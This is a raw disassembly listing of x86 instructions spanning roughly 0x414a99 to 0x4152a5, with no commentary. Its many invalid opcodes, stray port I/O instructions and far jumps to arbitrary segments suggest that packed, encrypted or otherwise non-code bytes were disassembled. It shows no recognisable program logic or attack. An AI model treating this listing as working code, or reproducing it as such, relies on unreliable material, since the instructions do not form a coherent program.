  414a99:	xchg   edi,eax
  414a9a:	das    
  414a9b:	es int 0xcf
  414a9e:	pop    ss
  414a9f:	ja     0x414aa4
  414aa1:	inc    edi
  414aa2:	push   eax
  414aa3:	das    
  414aa4:	xor    edx,edi
  414aa6:	addr16 iret 
  414aa8:	mov    ds:0xd1dd1120,eax
  414aad:	dec    ebx
  414aae:	popf   
  414aaf:	popw   ds
  414ab1:	int    0xed
  414ab3:	cld    
  414ab4:	jmp    0x4b153d57
  414ab9:	stc    
  414aba:	loop   0x414a8a
  414abc:	fsub   QWORD PTR [ebp-0x5de71cbd]
  414ac2:	lea    ebx,[esi+0x357b0838]
  414ac8:	sub    al,0x8b
  414aca:	pop    es
  414acb:	adc    edi,esi
  414acd:	in     eax,dx
  414ace:	sbb    BYTE PTR [ebx+ecx*1+0x54],bh
  414ad2:	popf   
  414ad3:	jp     0x414a9f
  414ad5:	mov    esp,DWORD PTR [ebp+0x7f]
  414ad8:	push   0x6a
  414ada:	cmp    ebp,DWORD PTR [ebp+0x49]
  414add:	dec    ecx
  414ade:	hlt    
  414adf:	and    eax,0x952308fe
  414ae4:	pushf  
  414ae5:	add    eax,0xea65819d
  414aea:	cmp    BYTE PTR [esi-0x6a],dl
  414aed:	dec    edi
  414aee:	data16 ja 0x414a98
  414af1:	ss jmp 0x7da:0xf7311263
  414af9:	(bad)  
  414afa:	test   DWORD PTR [ecx-0x66],0x62a392c3
  414b01:	cdq    
  414b02:	mov    ebx,0x4768919f
  414b07:	sub    bl,BYTE PTR gs:[esi-0x5cca21f]
  414b0e:	adc    edi,DWORD PTR [ebx]
  414b10:	xlat   BYTE PTR ds:[ebx]
  414b11:	aam    0xe5
  414b13:	xchg   BYTE PTR [esi],bh
  414b15:	add    DWORD PTR [esi],esp
  414b17:	lock and ebx,esi
  414b1a:	in     al,0xc6
  414b1c:	push   edi
  414b1d:	(bad)  
  414b1e:	stc    
  414b1f:	or     BYTE PTR [esi-0x50878c11],0x74
  414b26:	pop    esi
  414b27:	ds xchg ecx,eax
  414b29:	pop    esi
  414b2a:	popf   
  414b2b:	js     0x414b93
  414b2d:	xchg   ebp,eax
  414b2e:	mov    cl,0x3d
  414b30:	pop    edx
  414b31:	call   0x9abd:0xfc81b672
  414b38:	js     0x414b26
  414b3a:	cmp    eax,edx
  414b3c:	loope  0x414adb
  414b3e:	leave  
  414b3f:	mov    bl,0x6e
  414b41:	mov    WORD PTR [edi+0x56],?
  414b44:	ror    BYTE PTR [edi+0x712677b8],0x7f
  414b4b:	jne    0x414b9b
  414b4d:	test   BYTE PTR [edx+0x20bf8e32],al
  414b53:	repz sub BYTE PTR [eax],bh
  414b56:	sbb    ebx,DWORD PTR [edx]
  414b58:	mov    eax,0xc55d801
  414b5d:	pop    edx
  414b5e:	and    eax,DWORD PTR [ecx-0x62938177]
  414b64:	and    dh,BYTE PTR ds:0xf04619fc
  414b6a:	rcl    BYTE PTR [edi+0x1e909ac7],0x82
  414b71:	cmp    BYTE PTR [esi-0x6d],bh
  414b74:	ss jmp 0x60de:0xc261c752
  414b7c:	ins    DWORD PTR es:[edi],dx
  414b7d:	(bad)  
  414b7e:	ja     0x414bc4
  414b80:	and    al,0x6a
  414b82:	add    al,0x11
  414b84:	shl    BYTE PTR [eax-0x1b2d39c8],1
  414b8a:	jae    0x414bb9
  414b8c:	pop    es
  414b8d:	dec    edx
  414b8e:	dec    eax
  414b8f:	xchg   esi,eax
  414b90:	test   BYTE PTR [ecx+0x78],ch
  414b93:	xchg   DWORD PTR [edx-0x56],edi
  414b96:	jne    0x414b28
  414b98:	in     al,dx
  414b99:	rcl    BYTE PTR [ecx+0x72415b3b],cl
  414b9f:	jmp    0x414bf2
  414ba1:	sub    al,0x6e
  414ba3:	xor    ecx,DWORD PTR [esi]
  414ba5:	rol    ah,cl
  414ba7:	out    dx,eax
  414ba8:	inc    ebp
  414ba9:	addr16 inc eax
  414bab:	leave  
  414bac:	or     DWORD PTR [esi*4+0x47f265bf],ecx
  414bb3:	xchg   DWORD PTR [ebx-0x56920b11],esp
  414bb9:	sub    eax,0xdb70e740
  414bbe:	mov    esp,0xcd4c5ba8
  414bc3:	push   eax
  414bc4:	call   0x6df13e2a
  414bc9:	xchg   ebx,eax
  414bca:	dec    edi
  414bcb:	imul   edi,DWORD PTR [ebp-0x7721e602],0x6395e367
  414bd5:	mov    eax,0x6c7d071f
  414bda:	mov    ebx,es
  414bdc:	ret    
  414bdd:	jmp    0x414bc2
  414bdf:	mov    al,0x46
  414be1:	imul   BYTE PTR [edi-0xf28221e]
  414be7:	push   ss
  414be8:	neg    esp
  414bea:	lds    ebp,FWORD PTR [ebp-0x5effee5d]
  414bf0:	shl    DWORD PTR [eax],cl
  414bf2:	bound  ebp,QWORD PTR fs:[edi]
  414bf5:	rcr    DWORD PTR [edi],0x6
  414bf8:	mov    ecx,0xc379d5b8
  414bfd:	fst    st(0)
  414bff:	test   eax,0x43cce6f8
  414c04:	call   0x92f3:0xf58e50ca
  414c0b:	and    BYTE PTR [edi+ebp*2-0x6c],dh
  414c0f:	popf   
  414c10:	push   es
  414c11:	dec    ebx
  414c12:	cmp    eax,0x673ce83f
  414c17:	jne    0x414ba0
  414c19:	adc    eax,0x7a5f810f
  414c1e:	jl     0x414c2e
  414c20:	pop    ecx
  414c21:	mov    WORD PTR [eax],ds
  414c23:	sahf   
  414c24:	push   ss
  414c25:	pop    es
  414c26:	(bad)
  414c29:	sub    edi,DWORD PTR [ebx]
  414c2b:	fadd   st(7),st
  414c2d:	pop    ss
  414c2e:	out    dx,al
  414c2f:	pop    ebx
  414c30:	xchg   edi,eax
  414c31:	sbb    DWORD PTR [edx+0x7c],ebx
  414c34:	(bad)
  414c37:	lds    ecx,FWORD PTR [ecx*8+0x55ecd49a]
  414c3e:	xor    eax,0xf5805dde
  414c43:	loop   0x414c3e
  414c45:	xchg   edx,eax
  414c46:	imul   ebx,DWORD PTR [edi+0xb03bda3],0x49044400
  414c50:	daa    
  414c51:	sub    ah,BYTE PTR [esi+0x51]
  414c54:	inc    ecx
  414c55:	pop    eax
  414c56:	add    ebp,DWORD PTR [ebp+0x344ef720]
  414c5c:	mov    bh,0xd7
  414c5e:	mov    al,0x25
  414c60:	push   edx
  414c61:	pop    ecx
  414c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c63:	jg     0x414cb6
  414c65:	or     eax,0x63787d
  414c6a:	mov    ds:0xa4e36175,eax
  414c6f:	(bad)  
  414c70:	xchg   ecx,eax
  414c71:	mov    BYTE PTR [ebp-0x4c0314f8],cl
  414c77:	mov    ch,BYTE PTR [esp+eax*4]
  414c7a:	sbb    al,0x64
  414c7c:	cmc    
  414c7d:	push   0x67
  414c7f:	mov    DWORD PTR [ebp+eiz*2+0x6c],esp
  414c83:	mov    dh,0xe7
  414c85:	jg     0x414d06
  414c87:	jmp    0x414cf0
  414c89:	pop    ds
  414c8a:	mov    edi,0x3be76a8f
  414c8f:	xchg   edi,eax
  414c90:	out    0x29,eax
  414c92:	jge    0x414cb6
  414c94:	add    al,0x8a
  414c96:	sub    ah,ah
  414c98:	jge    0x414cfb
  414c9a:	jmp    DWORD PTR [eax-0x31da8537]
  414ca0:	pop    eax
  414ca1:	add    al,0xd0
  414ca3:	outs   dx,BYTE PTR ds:[esi]
  414ca4:	add    edi,DWORD PTR [edx-0x80]
  414ca7:	sub    ecx,DWORD PTR [esi-0x58]
  414caa:	(bad)  
  414cab:	xchg   edx,eax
  414cac:	stos   BYTE PTR es:[edi],al
  414cad:	cmp    eax,0x937a5941
  414cb2:	jge    0x414c70
  414cb4:	stos   BYTE PTR es:[edi],al
  414cb5:	mov    DWORD PTR [esi],esp
  414cb7:	adc    BYTE PTR [edx-0x7e894953],bh
  414cbd:	xchg   ecx,eax
  414cbe:	mov    BYTE PTR [ecx+0x15c61947],bl
  414cc4:	dec    esp
  414cc5:	imul   edi,ebp,0x56
  414cc8:	inc    ecx
  414cc9:	mov    BYTE PTR [edx],dl
  414ccb:	push   ss
  414ccc:	sub    edi,ecx
  414cce:	dec    DWORD PTR ds:0x5be73937
  414cd4:	dec    ecx
  414cd5:	adc    BYTE PTR [ecx],dl
  414cd7:	rcr    BYTE PTR [ebx+0x7b],1
  414cda:	cwde   
  414cdb:	test   BYTE PTR [ebx+0x3590d343],cl
  414ce1:	test   al,0x7a
  414ce3:	push   cs
  414ce4:	dec    esi
  414ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ce6:	jne    0x414d52
  414ce8:	dec    eax
  414ce9:	je     0x414cd2
  414ceb:	das    
  414cec:	in     eax,0xac
  414cee:	pop    esi
  414cef:	loop   0x414d17
  414cf1:	arpl   WORD PTR [ecx+0x6c3985c2],bx
  414cf7:	dec    ebx
  414cf8:	pop    esp
  414cf9:	mov    esi,0xd7b8e0aa
  414cfe:	push   ds
  414cff:	les    ebx,FWORD PTR [ebx]
  414d01:	inc    edx
  414d02:	adc    DWORD PTR [ecx],edx
  414d04:	mov    edx,0x378122af
  414d09:	lahf   
  414d0a:	push   edi
  414d0b:	in     eax,dx
  414d0c:	je     0x414d14
  414d0e:	sbb    DWORD PTR [ecx],ebp
  414d10:	mov    edx,eax
  414d12:	in     al,dx
  414d13:	adc    bh,BYTE PTR [edx+0x22]
  414d16:	and    DWORD PTR [ecx-0x4f],eax
  414d19:	call   0x17bf:0x50c674f7
  414d20:	adc    dl,ah
  414d22:	fs mov edx,0xa2ef0326
  414d28:	das    
  414d29:	xor    esi,DWORD PTR [edi+0xe6b0e5f]
  414d2f:	out    dx,al
  414d30:	jge    0x414daa
  414d32:	in     eax,0xe4
  414d34:	cli    
  414d35:	xchg   ebp,eax
  414d36:	mov    ecx,ecx
  414d38:	les    edi,FWORD PTR [eax-0x2a]
  414d3b:	cli    
  414d3c:	push   ebp
  414d3d:	add    edx,DWORD PTR [ebp+0x66]
  414d40:	fwait
  414d41:	sti    
  414d42:	imul   edx,DWORD PTR [bp+si+0x35f7],0x843681dd
  414d4b:	imul   ecx,DWORD PTR [edi+edx*4-0x24],0x133efbc2
  414d53:	or     edi,esi
  414d55:	retf   
  414d56:	or     DWORD PTR [eax+0x62baaa75],ebx
  414d5c:	push   esp
  414d5d:	mov    bl,0xc6
  414d5f:	repnz pop edx
  414d61:	sbb    eax,0xcc780daf
  414d66:	jecxz  0x414d62
  414d68:	in     al,0x1e
  414d6a:	pop    ebx
  414d6b:	jmp    0x2fff6f4c
  414d70:	fnsave [ebx+0x5]
  414d73:	cwde   
  414d74:	neg    BYTE PTR ds:0x16fd36c
  414d7a:	cmp    BYTE PTR [edi-0x3a09278f],0xda
  414d81:	mov    eax,ds:0x50a4b5f3
  414d86:	lods   al,BYTE PTR ds:[esi]
  414d87:	pop    esp
  414d88:	std    
  414d89:	inc    edx
  414d8a:	mov    al,0xc3
  414d8c:	loope  0x414d59
  414d8e:	mov    ecx,DWORD PTR [edx]
  414d90:	cmp    DWORD PTR [ebx],edi
  414d92:	arpl   WORD PTR [ecx+eiz*4],bp
  414d95:	push   edx
  414d96:	xchg   edi,eax
  414d97:	pop    ebp
  414d98:	(bad)  
  414d99:	outs   dx,BYTE PTR ds:[esi]
  414d9a:	xchg   DWORD PTR [ebp+ebp*4+0xa],edi
  414d9e:	fld    TBYTE PTR [edx]
  414da0:	xor    ah,al
  414da2:	push   esp
  414da3:	cli    
  414da4:	dec    edx
  414da5:	lea    ecx,[eax+0x5fa1190f]
  414dab:	retf   0x36e2
  414dae:	loop   0x414e22
  414db0:	adc    ebp,DWORD PTR [edx+eiz*4+0x24]
  414db4:	cmc    
  414db5:	imul   esi,DWORD PTR [edx+0x5c],0x41af9896
  414dbc:	test   BYTE PTR [esi-0xa],dl
  414dbf:	test   BYTE PTR [edi+0x23],bh
  414dc2:	mov    bl,0xf6
  414dc4:	cmp    edx,DWORD PTR [ebp+0x4d]
  414dc7:	retf   
  414dc8:	jle    0x414ded
  414dca:	cmp    al,0x8
  414dcc:	mov    eax,ds:0x869cab91
  414dd1:	and    edx,esi
  414dd3:	fistp  WORD PTR [edi]
  414dd5:	mov    ecx,0x7d2511d9
  414dda:	jmp    0x396e:0xbb7f55b5
  414de1:	add    ebx,DWORD PTR [esi+0x4eaf81a7]
  414de7:	mov    dh,0xb8
  414de9:	mov    bl,0x6e
  414deb:	mov    eax,ds:0xa5134011
  414df0:	add    eax,0xab5c7f0c
  414df5:	nop
  414df6:	retf   0x3d49
  414df9:	aad    0x89
  414dfb:	mov    esi,0x4c502d26
  414e00:	mov    dl,0x66
  414e02:	into   
  414e03:	repz inc edx
  414e05:	fs push eax
  414e07:	push   edx
  414e08:	int3   
  414e09:	adc    BYTE PTR [ebx-0x5b88e323],0x8e
  414e10:	ret    0x61a
  414e13:	(bad)  
  414e14:	jnp    0x414e6d
  414e16:	sahf   
  414e17:	cwde   
  414e18:	out    0x7a,al
  414e1a:	mov    dl,0x64
  414e1c:	sbb    edi,DWORD PTR [eax]
  414e1e:	(bad)  
  414e1f:	cld    
  414e20:	or     dh,bl
  414e22:	pop    esp
  414e23:	pop    es
  414e24:	mov    eax,esp
  414e26:	xchg   ebx,eax
  414e27:	fwait
  414e28:	or     al,0x7d
  414e2a:	outs   dx,DWORD PTR ds:[esi]
  414e2b:	jle    0x414e73
  414e2d:	and    bl,bh
  414e2f:	pop    ebx
  414e30:	inc    esp
  414e31:	popf   
  414e32:	and    ebp,DWORD PTR [ebx]
  414e34:	fdiv   st(4),st
  414e36:	test   BYTE PTR [ecx-0x633b8e92],dl
  414e3c:	je     0x414e54
  414e3e:	xchg   ebp,eax
  414e3f:	(bad)  
  414e40:	push   0x46dcbe4
  414e45:	sub    BYTE PTR [esi+0x5b5e952e],dh
  414e4b:	pusha  
  414e4c:	cmp    ecx,DWORD PTR [edx]
  414e4e:	out    0x70,al
  414e50:	xor    al,BYTE PTR [esi]
  414e52:	inc    edx
  414e53:	mov    ecx,0x68dc1918
  414e58:	pusha  
  414e59:	loope  0x414e05
  414e5b:	out    dx,al
  414e5c:	pop    edi
  414e5d:	push   es
  414e5e:	nop
  414e5f:	adc    al,0x36
  414e61:	jne    0x414e64
  414e63:	sbb    eax,0x4ce34cbc
  414e68:	push   ecx
  414e69:	push   0x7d57e1de
  414e6e:	call   0x33cf:0x9ce0f1ff
  414e75:	jnp    0x414e2e
  414e77:	sbb    eax,0x8d8a54f5
  414e7c:	add    eax,0x9f1dd938
  414e81:	xor    ecx,DWORD PTR [ebp+0x28137c5c]
  414e87:	iret   
  414e88:	push   edi
  414e89:	sbb    eax,0xc49fd9ba
  414e8e:	nop
  414e8f:	inc    BYTE PTR [edx+ebx*2+0x544fe358]
  414e96:	shr    edx,1
  414e98:	lea    ebp,[edi-0x60]
  414e9b:	pusha  
  414e9c:	add    edi,0x50
  414e9f:	arpl   bx,si
  414ea1:	loope  0x414eb0
  414ea3:	xchg   esp,eax
  414ea4:	hlt    
  414ea5:	aam    0xa9
  414ea7:	mov    cs,WORD PTR [edi]
  414ea9:	mov    cl,bh
  414eab:	sbb    al,0x8f
  414ead:	int    0xf3
  414eaf:	or     bh,al
  414eb1:	xchg   edi,eax
  414eb2:	or     DWORD PTR [edi-0x41624ed5],esi
  414eb8:	in     eax,0x71
  414eba:	fnstenv [edx+0xa44d0d7]
  414ec0:	push   cs
  414ec1:	xor    ch,BYTE PTR [edx-0x33]
  414ec4:	dec    ebp
  414ec5:	xchg   ecx,eax
  414ec6:	iret   
  414ec7:	jmp    0x414f23
  414ec9:	inc    ecx
  414eca:	sbb    eax,0x414e265e
  414ecf:	and    dh,BYTE PTR [ebp-0x5e]
  414ed2:	sahf   
  414ed3:	adc    eax,0x35efae6c
  414ed8:	push   edx
  414ed9:	shr    BYTE PTR [edi-0x7430ffa2],0x4d
  414ee0:	sub    al,0x3d
  414ee2:	mov    dl,0xa2
  414ee4:	lds    edi,FWORD PTR [edi+0x7725c81c]
  414eea:	inc    edx
  414eeb:	cli    
  414eec:	jge    0x414e75
  414eee:	push   0xbd78b462
  414ef3:	clc    
  414ef4:	loop   0x414f21
  414ef6:	push   ebx
  414ef7:	loopne 0x414f56
  414ef9:	fcom   DWORD PTR [ebp+0x72969acb]
  414eff:	leave  
  414f00:	js     0x414ecf
  414f02:	and    al,0x39
  414f04:	sbb    cl,BYTE PTR [esi+0x67dc9cb5]
  414f0a:	dec    esi
  414f0b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f0d:	inc    esi
  414f0e:	sbb    bh,al
  414f10:	loope  0x414ec3
  414f12:	repz pop ss
  414f14:	cmc    
  414f15:	out    dx,eax
  414f16:	mov    dh,0x30
  414f18:	lods   eax,DWORD PTR ds:[esi]
  414f19:	pop    esi
  414f1a:	push   eax
  414f1b:	scas   eax,DWORD PTR es:[edi]
  414f1c:	cmp    ebx,ebp
  414f1e:	lea    ebx,[esi]
  414f20:	add    BYTE PTR [esi-0x4eac63ce],bh
  414f26:	retf   0x3317
  414f29:	dec    ebp
  414f2a:	data16 setno cl
  414f2e:	aas    
  414f2f:	mov    ds:0x4feb0be4,eax
  414f34:	jge    0x414f96
  414f36:	mov    dl,0xd7
  414f38:	jecxz  0x414f7d
  414f3a:	mov    cl,0x9d
  414f3c:	and    esp,DWORD PTR [eax+0x74520862]
  414f42:	popf   
  414f43:	into   
  414f44:	add    DWORD PTR [esp+eax*1+0x7b2a6435],esi
  414f4b:	cmp    edx,ebx
  414f4d:	test   al,dl
  414f4f:	and    eax,0x1e49f99d
  414f54:	mov    bh,0xa7
  414f56:	dec    edi
  414f57:	sub    al,0x7e
  414f59:	mov    dl,0x74
  414f5b:	xor    cl,ah
  414f5d:	js     0x414fd9
  414f5f:	cs das 
  414f61:	neg    DWORD PTR ds:0xc104377a
  414f67:	xor    al,0x4e
  414f69:	or     ch,ch
  414f6b:	inc    eax
  414f6c:	push   eax
  414f6d:	int3   
  414f6e:	fidiv  WORD PTR [ebx-0x3e62319a]
  414f74:	cwde   
  414f75:	inc    ecx
  414f76:	sbb    dl,ch
  414f78:	mov    ecx,eax
  414f7a:	push   ecx
  414f7b:	mov    ecx,0x64c02a1a
  414f80:	xchg   esi,eax
  414f81:	lahf   
  414f82:	neg    DWORD PTR [edx-0x6af70d79]
  414f88:	fld    st(0)
  414f8a:	and    esp,DWORD PTR [esi+0x2f]
  414f8d:	aad    0x9f
  414f8f:	out    0x15,eax
  414f91:	add    eax,0x522224b9
  414f96:	iret   
  414f97:	test   BYTE PTR [edx+0x3fdaf756],cl
  414f9d:	dec    edx
  414f9e:	sub    eax,0xd5d52c8f
  414fa3:	dec    edx
  414fa4:	inc    eax
  414fa5:	add    DWORD PTR [eax],eax
  414fa7:	add    DWORD PTR [ecx-0x69be1127],ecx
  414fad:	pop    edx
  414fae:	jle    0x41500c
  414fb0:	(bad)
  414fb4:	push   ebx
  414fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fb6:	lds    edx,FWORD PTR [eiz*8-0x4e7ef938]
  414fbd:	enter  0x488a,0x4d
  414fc1:	aam    0x68
  414fc3:	ja     0x415005
  414fc5:	fld    QWORD PTR [esi]
  414fc7:	das    
  414fc8:	test   BYTE PTR ds:0xe4492761,al
  414fce:	loopne 0x414fe5
  414fd0:	std    
  414fd1:	in     eax,0x5b
  414fd3:	push   ss
  414fd4:	ds repz pop ecx
  414fd7:	sbb    DWORD PTR [edi+esi*1],esi
  414fda:	gs mov eax,0x74062bb6
  414fe0:	inc    esp
  414fe1:	sbb    ecx,0xffffff99
  414fe4:	adc    DWORD PTR [esi],0x9f37db7b
  414fea:	sbb    esp,0xcc87b8bc
  414ff0:	nop
  414ff1:	js     0x415036
  414ff3:	inc    esp
  414ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ff5:	aam    0x5a
  414ff7:	or     ebx,ebp
  414ff9:	mov    bl,0x89
  414ffb:	cmp    eax,0xd70ed883
  415000:	push   eax
  415001:	xchg   BYTE PTR [ebp-0x65],bh
  415004:	lahf   
  415005:	push   es
  415006:	adc    DWORD PTR [edx+0x1a944102],esi
  41500c:	je     0x414fb8
  41500e:	push   0x45
  415010:	mov    ebx,0x390c518b
  415015:	jle    0x415034
  415017:	or     BYTE PTR [ecx-0x7d],ch
  41501a:	(bad)  
  41501b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41501c:	mov    edx,0x9d4616ef
  415021:	loope  0x415017
  415023:	cmp    ebp,DWORD PTR ds:0x7b4c6a3
  415029:	into   
  41502a:	mov    cl,0xe9
  41502c:	push   ebx
  41502d:	mov    ebx,0xac06ae16
  415032:	push   ebx
  415033:	mov    cl,0x1f
  415035:	adc    DWORD PTR [ebp+0x68],edi
  415038:	push   eax
  415039:	fsubr  st(6),st
  41503b:	jle    0x414ff6
  41503d:	jmp    0x4150a0
  41503f:	fs sti 
  415041:	int3   
  415042:	ret    
  415043:	cwde   
  415044:	imul   ebp,DWORD PTR gs:0x7e20fa45,0xffffffbe
  41504c:	lods   eax,DWORD PTR ds:[esi]
  41504d:	(bad)  
  41504e:	fidivr DWORD PTR [edi+0x3e328ec5]
  415054:	pop    ecx
  415055:	pop    edx
  415056:	fstp   TBYTE PTR [ebx+edi*1-0x3d]
  41505a:	mov    eax,ds:0xb0af33c1
  41505f:	bound  ecx,QWORD PTR [esi+0x3a]
  415062:	rcl    DWORD PTR [eax+0x32],1
  415065:	xchg   esp,eax
  415066:	and    al,BYTE PTR [eax]
  415068:	push   esi
  415069:	popa   
  41506a:	mov    DWORD PTR [edi],eax
  41506c:	cmp    BYTE PTR ds:0x37a3f292,ch
  415072:	sub    DWORD PTR [ebx+0xbe0ce72],0x39
  415079:	jecxz  0x415049
  41507b:	lock fild WORD PTR [edx+0x702c5208]
  415082:	and    esi,esi
  415084:	push   ecx
  415085:	and    BYTE PTR [edi-0x11],dh
  415088:	mov    ds:0xc6355546,al
  41508d:	jmp    0x7e1b:0x4a4ef288
  415094:	loope  0x415067
  415096:	push   esp
  415097:	pop    edx
  415098:	outs   dx,DWORD PTR ds:[esi]
  415099:	mov    edx,0x3fa47331
  41509e:	jmp    0xc3ae:0x15ed6b35
  4150a5:	retf   0x4ab1
  4150a8:	(bad)
  4150ac:	hlt    
  4150ad:	dec    ecx
  4150ae:	dec    edi
  4150af:	bound  edi,QWORD PTR [ecx+0x7b]
  4150b2:	pusha  
  4150b3:	(bad)  
  4150b4:	mov    al,0x8c
  4150b6:	add    BYTE PTR [eax+0x3fa234],cl
  4150bc:	jmp    0x5ce24efc
  4150c1:	pop    eax
  4150c2:	or     dl,BYTE PTR [eax]
  4150c4:	inc    ecx
  4150c5:	xchg   ecx,eax
  4150c6:	xor    ecx,eax
  4150c8:	mov    bl,0xc1
  4150ca:	mov    edx,0x18244c46
  4150cf:	or     ecx,DWORD PTR [ebp-0x715f754b]
  4150d5:	pop    edx
  4150d6:	add    bh,ah
  4150d8:	in     eax,dx
  4150d9:	mov    eax,ds:0x945183f3
  4150de:	fisubr WORD PTR [edi+esi*1-0x2ebe2d4a]
  4150e5:	pop    esp
  4150e6:	inc    eax
  4150e7:	aam    0x1f
  4150e9:	es call 0xf343041f
  4150ef:	sub    BYTE PTR [edx],dl
  4150f1:	das    
  4150f2:	sub    BYTE PTR [eax-0x13e54b3a],ch
  4150f8:	mov    ds:0x89a8284c,al
  4150fd:	sub    BYTE PTR [ebx-0x28],cl
  415100:	add    ch,BYTE PTR [edi+0xae56410]
  415106:	cmp    esp,DWORD PTR [edx-0x5f]
  415109:	push   esi
  41510a:	jns    0x4150c4
  41510c:	sub    eax,edx
  41510e:	aaa    
  41510f:	aad    0x83
  415111:	inc    eax
  415112:	adc    edx,DWORD PTR [ebx]
  415114:	dec    edi
  415115:	xlat   BYTE PTR ds:[ebx]
  415116:	fwait
  415117:	or     DWORD PTR [edx],edx
  415119:	inc    edx
  41511a:	sbb    al,0x4
  41511c:	dec    ebp
  41511d:	mov    edi,0xdf6164f3
  415122:	in     eax,0x7b
  415124:	fnstenv [esi+0x29d3bd36]
  41512a:	fcomi  st,st(0)
  41512c:	sub    BYTE PTR [ecx-0x3c],ch
  41512f:	(bad)
  415134:	mov    edx,DWORD PTR [esi]
  415136:	and    DWORD PTR ds:0x1dad735,edx
  41513c:	add    BYTE PTR [edi-0x39cb3ec2],ah
  415142:	xchg   edx,eax
  415143:	adc    DWORD PTR [esp+edi*2],edx
  415146:	hlt    
  415147:	mov    DWORD PTR [ebx+0x21b0cd4b],edx
  41514d:	xchg   esp,eax
  41514e:	pop    ebp
  41514f:	arpl   WORD PTR [eax+0x63],ax
  415152:	add    edx,DWORD PTR ss:[eax-0x6318010e]
  415159:	pop    ss
  41515a:	or     dh,BYTE PTR [eax+0x3e]
  41515d:	or     ebx,DWORD PTR [ebp-0x15]
  415160:	jg     0x4151ba
  415162:	in     al,dx
  415163:	dec    ebp
  415164:	xor    al,BYTE PTR [esi-0x5b]
  415167:	bound  edx,QWORD PTR [ebx-0x5b6f959b]
  41516d:	sahf   
  41516e:	and    DWORD PTR [edx+0x64d5c96a],esi
  415174:	pop    eax
  415175:	mov    esp,0x52fc1b85
  41517a:	mov    dh,BYTE PTR [esp+edi*2-0x28]
  41517e:	mov    ch,0x3
  415180:	xor    al,0x4d
  415182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415183:	dec    esi
  415184:	push   ebp
  415185:	int3   
  415186:	or     BYTE PTR [esi],cl
  415188:	nop
  415189:	cmp    ah,BYTE PTR [esi-0x6695aeaf]
  41518f:	pop    ss
  415190:	ror    BYTE PTR [edx],0x16
  415193:	lds    ebx,FWORD PTR [ebx+0x361d16df]
  415199:	pop    ecx
  41519a:	int    0x81
  41519c:	das    
  41519d:	cmp    ah,ah
  41519f:	shr    DWORD PTR [edx-0x1f],0xcb
  4151a3:	daa    
  4151a4:	xlat   BYTE PTR ds:[ebx]
  4151a5:	mov    DWORD PTR [ebp-0x7aa91887],ebp
  4151ab:	fwait
  4151ac:	push   edx
  4151ad:	(bad)  
  4151ae:	outs   dx,BYTE PTR ds:[esi]
  4151af:	test   al,0xd6
  4151b1:	pop    esi
  4151b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b3:	sti    
  4151b4:	clc    
  4151b5:	lahf   
  4151b6:	std    
  4151b7:	sub    eax,0x5bb59b08
  4151bc:	and    bh,BYTE PTR [ecx+0x51]
  4151bf:	loop   0x415142
  4151c1:	xor    ecx,DWORD PTR [ecx+edx*8-0x4b2fe652]
  4151c8:	imul   edx,DWORD PTR [eax-0x6a],0xffffff9d
  4151cc:	mov    eax,0x66c2f552
  4151d1:	push   cs
  4151d2:	inc    edi
  4151d3:	or     eax,0xad94ead4
  4151d8:	imul   BYTE PTR [eax]
  4151da:	enter  0x9685,0xe7
  4151de:	and    BYTE PTR [ecx-0x6ac6fe5a],cl
  4151e4:	push   0x4e
  4151e6:	in     al,dx
  4151e7:	inc    ebx
  4151e8:	fst    DWORD PTR [ebx+0x5484ffa7]
  4151ee:	mov    edx,0x3e4f229d
  4151f3:	sbb    dl,BYTE PTR [edx]
  4151f5:	std    
  4151f6:	push   cs
  4151f7:	pop    ds
  4151f8:	aas    
  4151f9:	sub    ecx,DWORD PTR [ebp+0x75]
  4151fc:	mov    ecx,DWORD PTR [esi-0x8914b77]
  415202:	xor    eax,esp
  415204:	xchg   ebx,eax
  415205:	test   eax,0x47f8770a
  41520a:	inc    esp
  41520b:	xchg   ax,ax
  41520d:	cmp    al,0x8
  41520f:	in     eax,0x5a
  415211:	out    0x63,al
  415213:	leave  
  415214:	enter  0xc699,0x23
  415218:	in     eax,dx
  415219:	in     eax,0x29
  41521b:	fcmovnu st,st(2)
  41521d:	push   ecx
  41521e:	retf   0xf67a
  415221:	mov    bl,0x6
  415223:	cmp    eax,0xb8c500b8
  415228:	pop    edi
  415229:	inc    ebx
  41522a:	sar    DWORD PTR [eax],0x92
  41522d:	jo     0x4151e9
  41522f:	hlt    
  415230:	xor    esi,eax
  415232:	icebp  
  415233:	ror    BYTE PTR [eax+0x5a],0xf8
  415237:	fcom   QWORD PTR [ebp+ecx*1-0x7a958a79]
  41523e:	mov    esp,0xe5a8c198
  415243:	push   edx
  415244:	xchg   edi,eax
  415245:	cmp    eax,0x28145331
  41524a:	pop    ebp
  41524b:	mov    ds:0xf23dc624,al
  415250:	dec    edi
  415251:	hlt    
  415252:	push   ebp
  415253:	ins    BYTE PTR es:[edi],dx
  415254:	leave  
  415255:	adc    al,0x96
  415257:	cmp    eax,ebx
  415259:	mov    cl,0xac
  41525b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41525c:	loop   0x4152d2
  41525e:	lods   eax,DWORD PTR ds:[esi]
  41525f:	lock mov dh,0x8e
  415262:	(bad)  
  415263:	in     al,dx
  415264:	push   edx
  415265:	mov    bh,0xf1
  415267:	and    eax,0x81bea388
  41526c:	push   eax
  41526d:	xchg   BYTE PTR [ebx+ecx*1+0xa21b3f3],bl
  415274:	lahf   
  415275:	das    
  415276:	mov    eax,0x633c890e
  41527b:	jecxz  0x4152ba
  41527d:	test   eax,0x53f1ff87
  415282:	imul   BYTE PTR [edi]
  415284:	sti    
  415285:	or     DWORD PTR [ebx+ebx*8],ebx
  415288:	dec    ebp
  415289:	repz addr16 retf 0x26f
  41528e:	push   eax
  41528f:	inc    eax
  415290:	cdq    
  415291:	daa    
  415292:	mov    edi,0x5b802cd8
  415297:	add    al,0x5f
  415299:	clc    
  41529a:	test   BYTE PTR [edx+ebp*8+0x3b],bl
  41529e:	retf   
  41529f:	add    cl,BYTE PTR [ecx-0x77c6ca4c]
  4152a5:	xchg   ebx,eax
